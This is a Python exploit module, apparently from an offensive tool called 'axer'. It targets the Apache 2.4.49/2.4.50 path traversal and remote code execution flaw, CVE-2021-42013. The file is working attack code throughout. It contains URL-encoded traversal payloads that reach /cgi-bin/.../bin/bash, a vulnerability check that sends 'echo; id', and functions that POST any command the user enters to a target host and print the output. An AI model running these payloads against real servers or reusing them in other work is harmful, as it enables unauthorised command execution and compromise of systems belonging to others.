import requests
from core.modular import Module

class Exploit(Module):
    """
    An exploit module for Apache 2.4.49/50 Remote Code Execution and Path Traversal.

    This class represents an exploit module that targets the CVE-2021-42013 vulnerability
    in Apache 2.4.49 and 2.4.50. It allows executing commands remotely on a vulnerable server.

    Attributes:
        name (str): The name of the exploit.
        description (str): A brief description of the exploit.
        author (str): The author of the exploit.
        creation_date (str): The creation date of the exploit.

    Methods:
        execute(): Execute the exploit by interacting with the user and launching the attack.
    """

    def __init__(self):
        """
        Initialize an Exploit object with attributes specific to CVE-2021-42013 exploit.
        """
        self.name           = "CVE-2021-42013"
        self.description    = "Apache 2.4.49/50 RCE & Path Traversal"
        self.author         = "Username"
        self.creation_date  = "12-07-2023"

    def execute(self):
        """
        Execute the CVE-2021-42013 exploit by interacting with the user and launching the attack.

        This method prompts the user for input, including the Apache version (2.4.49 or 2.4.50),
        the host, and the command to execute. It then constructs and sends the malicious request
        to the target server to exploit the vulnerability.
        """
        ap_v = input("axer(CVE-2021-42013) ~ [2.4.49/2.4.50] âžœ ")
        ap_host = input(f"axer(CVE-2021-42013) ðŸ¢’ [host]          âžœ ")
        ap_cmd = input(f"axer(CVE-2021-42013) ðŸ¢’ [cmd]           âžœ ")

        c = Child(ap_host, ap_cmd)
        if "49" in ap_v:
            if c.validate('/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'):
                c.cve_49()
        else:
            if c.validate('/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'):
                c.cve_50()

    def __str__(self):
        """
        Return a formatted string representation of the exploit.
        """
        return f"{self.name}\n{self.description}"


class Child:
    """
    A class representing a child process for exploit execution.

    This class contains methods to validate the target's vulnerability, launch the exploit
    for Apache 2.4.49, and launch the exploit for Apache 2.4.50.

    Methods:
        validate(payload): Validate the target's vulnerability.
        cve_49(): Exploit for Apache 2.4.49.
        cve_50(): Exploit for Apache 2.4.50.
    """

    def __init__(self, host, cmd):
        """
        Initialize a Child object with target host and command to execute.
        """
        self.ap_host = host
        self.at_cmd = cmd

    def validate(self, payload):
        """
        Validate the target's vulnerability to CVE-2021-42013.

        This method constructs and sends a request to the target server with a payload
        designed to trigger the vulnerability. If the response indicates success, the
        target is considered vulnerable.

        Args:
            payload (str): The payload to be appended to the URL for the request.

        Returns:
            bool: True if the target is vulnerable, False otherwise.
        """
        try:
            url = f"http://{self.ap_host}{payload}"
            session = requests.Session()
            command = "echo; id"
            req = requests.Request('POST', url=url, data=command)
            prepare = req.prepare()
            prepare.url = url
            response = session.send(prepare, timeout=5)
            output = response.text
            if "uid" in output:
                print(f"[ DEBUG ] Target {self.ap_host} is vulnerable!")
                return True
            else:
                print(f"[ DEBUG ] Target {self.ap_host} isn't vulnerable.")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[ ERROR ] An error occurred: {e}")
            return False
        except KeyboardInterrupt:
            return False

    def cve_49(self):
        """
        Exploit Apache 2.4.49 using CVE-2021-42013 vulnerability.

        This method constructs and sends a request to the target server to exploit
        the CVE-2021-42013 vulnerability in Apache 2.4.49.

        Args:
            None

        Returns:
            None
        """
        url = f"http://{self.ap_host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash"
        command = self.at_cmd
        try:
            response = requests.post(url, data=command)
            output = response.text
            print(output)
        except requests.exceptions.RequestException as e:
            print(f"[ ERROR ] An error occurred: {e}")

    def cve_50(self):
        """
        Exploit Apache 2.4.50 using CVE-2021-42013 vulnerability.

        This method constructs and sends a request to the target server to exploit
        the CVE-2021-42013 vulnerability in Apache 2.4.50.

        Args:
            None

        Returns:
            None
        """
        url = f"http://{self.ap_host}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"
        command = self.at_cmd
        try:
            response = requests.post(url, data=command)
            output = response.text
            print(output)
        except requests.exceptions.RequestException as e:
            print(f"[ ERROR ] An error occurred: {e}")
